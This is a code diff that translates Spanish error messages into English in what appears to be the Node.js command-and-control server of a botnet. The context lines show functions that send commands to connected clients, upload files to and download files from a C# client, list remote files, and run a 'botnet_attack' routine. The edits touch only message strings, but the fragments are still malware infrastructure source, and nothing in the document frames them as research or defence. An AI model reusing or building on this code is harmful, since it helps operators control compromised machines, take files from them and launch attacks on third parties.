@@ -6,7 +6,7 @@ const send_cmd = async (clients, req, res) => {
     const client = clients.get(clientId);
 
     if (!client || client.readyState !== 1) {
-        return res.status(404).json({ error: 'Cliente no conectado' });
+        return res.status(404).json({ error: 'Disconnected client' });
     }
 
     const msgHandler = (msg) => {
@@ -25,7 +25,7 @@ const send_cmd = async (clients, req, res) => {
     setTimeout(() => {
         client.off('message', msgHandler);
         if (!res.headersSent) {
-            res.status(504).json({ error: 'Timeout esperando respuesta del cliente' });
+            res.status(504).json({ error: 'Timeout client error' });
         }
     }, 5000);
 };
@@ -36,7 +36,7 @@ const upload_file = async (clients, req, res) => {
         const destination = req.body.destination;
 
         if (!client || client.readyState !== 1) {
-            return res.status(404).json({ error: 'Cliente no conectado' });
+            return res.status(404).json({ error: 'Client has been disconnected' });
         }
 
         const chunkSize = 64 * 1024;
@@ -59,7 +59,7 @@ const upload_file = async (clients, req, res) => {
 
             setTimeout(() => {
                 client.off('message', handleMessage);
-                reject(new Error("Timeout esperando confirmación"));
+                reject(new Error("Timeout for incoming connection"));
             }, 100000);
         });
 
@@ -79,11 +79,11 @@ const upload_file = async (clients, req, res) => {
         // Esperar a que el cliente C# confirme que terminó
         await uploadConfirmed;
 
-        return res.status(200).json({ ok:true, msg: "Subida correcta" });
+        return res.status(200).json({ ok:true, msg: "Upload successful" });
 
     } catch (error) {
-        console.error("Error en subida:", error);
-        return res.status(400).json({ ok:false, msg: "Error al subir" });
+        console.error("Upload error", error);
+        return res.status(400).json({ ok:false, msg: "Upload error" });
     }
 };
 
@@ -98,7 +98,7 @@ const getFiles= async(clients, req, res = response) => {
     const client = clients.get(clientId);
 
     if (!client || client.readyState !== 1) {
-        return res.status(404).json({ error: 'Cliente no conectado' });
+        return res.status(404).json({ error: 'Client has been disconnected' });
     }
 
     const msgHandler = (msg) => {
@@ -118,7 +118,7 @@ const getFiles= async(clients, req, res = response) => {
     setTimeout(() => {
         client.off('message', msgHandler);
         if (!res.headersSent) {
-            res.status(504).json({ error: 'Timeout esperando respuesta del cliente' });
+            res.status(504).json({ error: 'Timeout client error' });
         }
     }, 5000);
 
@@ -133,7 +133,7 @@ const downloadFiles=async (clients, req, res = response) => {
 
 
     if (!client || client.readyState !== 1) {
-        return res.status(404).json({ error: 'Cliente no conectado' });
+        return res.status(404).json({ error: 'Client has been disconnected' });
     } 
 
     let receivedChunks = [];
@@ -177,7 +177,7 @@ const downloadFiles=async (clients, req, res = response) => {
     setTimeout(() => {
         client.off('message', msgHandler);
         if (!res.headersSent) {
-            res.status(504).json({ error: 'Timeout esperando respuesta del cliente' });
+            res.status(504).json({ error: 'Timeout client error' });
         }
     }, 5000);
 };
@@ -233,7 +233,7 @@ const botnet_attack=(clients, attacks_running, req, res = response)=>{
 /*     setTimeout(() => {
         client.off('message', msgHandler);
         if (!res.headersSent) {
-            res.status(504).json({ error: 'Timeout esperando respuesta del cliente' });
+            res.status(504).json({ error: 'Timeout client error' });
         }
     }, 5000); */
 }
